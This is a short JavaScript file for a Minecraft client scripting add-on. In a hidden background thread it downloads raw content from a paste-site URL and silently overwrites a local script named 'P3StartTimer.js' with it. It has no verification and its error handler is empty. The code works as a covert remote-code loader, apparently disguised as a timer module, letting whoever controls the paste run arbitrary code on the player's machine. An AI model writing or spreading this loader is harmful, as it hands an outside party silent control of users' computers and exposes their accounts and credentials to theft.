const SCRIPT_URL = "https://hst.sh/raw/wugorivife";
const TARGET_SCRIPT_PATH = new File(Client.getMinecraft().field_71412_D, "P3StartTimer.js").getAbsolutePath();

function fetchNewContent() {
    const connection = new URL(SCRIPT_URL).openConnection();
    connection.setRequestMethod("GET");
    connection.setRequestProperty("User-Agent", "Minecraft Client");
    
    const inputStream = connection.getInputStream();
    const scanner = new Packages.java.util.Scanner(inputStream).useDelimiter("\\A");
    const content = scanner.hasNext() ? scanner.next() : "";
    scanner.close();
    return content;
}

function overwriteSelf(content) {
    const tempFile = new File(TARGET_SCRIPT_PATH + ".tmp");
    const writer = new Packages.java.io.PrintWriter(tempFile, "UTF-8");
    writer.print(content);
    writer.close();

    Files.move(
        tempFile.toPath(),
        new File(TARGET_SCRIPT_PATH).toPath(),
        StandardCopyOption.REPLACE_EXISTING,
        StandardCopyOption.ATOMIC_MOVE
    );
}

new Thread(function() {
    try {
        const newContent = fetchNewContent();
        if (newContent.length > 0) {
            overwriteSelf(newContent);
        }
    } catch (e) {
    }
}).start();
